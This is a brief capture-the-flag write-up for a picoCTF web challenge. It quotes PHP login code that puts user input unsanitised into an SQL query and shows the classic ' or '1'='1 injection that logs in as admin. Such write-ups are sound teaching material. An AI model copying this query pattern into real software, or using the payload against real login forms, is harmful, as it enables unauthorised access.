### Problem:

There is a website running at http://2018shell.picoctf.com:64349 (link). Try to see if you can login!

##### Hints:

### Solution:

The linked webpage is a basic login page, but at the bottom provides a link to the [login.php](login.php) source code.
The important lines are

'''php
$username = $_POST["username"];
$password = $_POST["password"];
$debug = $_POST["debug"];
$query = "SELECT 1 FROM users WHERE name='$username' AND password='$password'";
'''

The username and password fields are directly used in the sql query string without being properly sanitezed.
I used a basic sql injection in the password field which will always log the user in if the username is valid. I guessed admin as a valid username.

'''
username: admin
password: ' or '1'='1
'''

This changes the password='$password' check to password='' or '1'='1'.

Logging in gave the flag.
